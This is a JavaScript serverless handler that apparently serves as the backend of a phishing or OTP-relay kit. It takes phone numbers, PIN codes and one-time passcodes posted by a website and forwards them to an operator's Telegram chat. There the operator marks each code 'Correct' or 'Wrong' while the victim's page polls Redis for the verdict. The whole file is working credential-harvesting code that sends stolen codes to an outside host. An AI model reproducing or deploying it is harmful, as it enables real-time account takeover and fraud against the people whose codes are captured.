import { Redis } from '@upstash/redis';

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN,
});

export default async function handler(req, res) {
    const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_TOKEN || !CHAT_ID) {
        return res.status(500).json({ error: "Missing Telegram Env Vars" });
    }

    // 1. WEBSITE POLLING
    if (req.method === 'GET') {
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
        res.setHeader('Pragma', 'no-cache');
        
        const { userId, type } = req.query;
        const key = `status_${userId}_${type}`;
        
        try {
            const status = await redis.get(key) || 'pending';
            console.log(`[REDIS GET] Key: ${key} | Status: ${status}`);
            
            if (status !== 'pending') {
                await redis.del(key);
            }
            return res.status(200).json({ status: status });
        } catch (error) {
            console.error("[REDIS GET ERROR]", error);
            return res.status(200).json({ status: 'pending' }); 
        }
    }

    // 2. POST REQUESTS
    if (req.method === 'POST') {
        try {
            const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;

            // A. TELEGRAM BUTTON CLICKED
            if (body.callback_query) {
                const callback = body.callback_query;
                const data = callback.data; 
                
                const parts = data.split('_');
                const action = parts[0]; 
                const type = parts[1]; 
                const userId = parts[2];

                const key = `status_${userId}_${type}`;
                const newStatus = action === 'approve' ? 'approved' : 'rejected';
                
                try {
                    await redis.set(key, newStatus, { ex: 600 });
                    console.log(`[REDIS SET] Key: ${key} | Status: ${newStatus}`);
                } catch (redisError) {
                    console.error("[REDIS SET ERROR]", redisError);
                }

                let statusText = action === 'approve' 
                    ? `\n\n✅ <b>APPROVED</b> - User can proceed` 
                    : `\n\n❌ <b>REJECTED</b> - User must try again`;

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: callback.message.chat.id,
                        message_id: callback.message.message_id,
                        text: callback.message.text + statusText,
                        parse_mode: 'HTML'
                    })
                });

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ callback_query_id: callback.id })
                });

                return res.status(200).send('OK');
            }

            // B. WEBSITE SENDING DATA
            if (body.action === 'send') {
                const { type, userId, data } = body;
                const time = new Date().toLocaleString('en-GB');
                
                try {
                    await redis.set(`status_${userId}_${type}`, 'pending', { ex: 600 });
                    console.log(`[REDIS SET] Key: status_${userId}_${type} | Status: pending`);
                } catch (redisError) {
                    console.error("[REDIS SET PENDING ERROR]", redisError);
                }
                
                let message = `# Thor - ${type} Verification\n`;
                message += `<b>${type} VERIFICATION NEEDED</b>\n\n`;
                message += `<b>USER DETAILS:</b>\n`;
                message += `• Phone Number: ${data.phone}\n`;
                
                if (type === 'PHONE_PIN') {
                    message += `• PIN Code: <code>${data.pin}</code>\n`;
                } else {
                    message += `• OTP Code: <code>${data.value}</code>\n`;
                }

                message += `• Username & Pass: user_${userId}\n`;
                message += `• Time: ${time}\n`;
                message += `• Bot: user75\n\n`;
                message += `Verify the ${type}:\n`;
                message += `• Timeout: 5 minutes\n`;

                const keyboard = {
                    inline_keyboard: [
                        [{ text: `✅ Correct`, callback_data: `approve_${type}_${userId}` }],
                        [{ text: `❌ Wrong`, callback_data: `reject_${type}_${userId}` }]
                    ]
                };

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        text: message, 
                        parse_mode: 'HTML',
                        reply_markup: keyboard
                    })
                });

                return res.status(200).json({ success: true });
            }
        } catch (error) {
            console.error("[SERVER ERROR]", error);
            return res.status(500).json({ error: error.message });
        }
    }
    return res.status(405).json({ error: 'Method not allowed' });
}
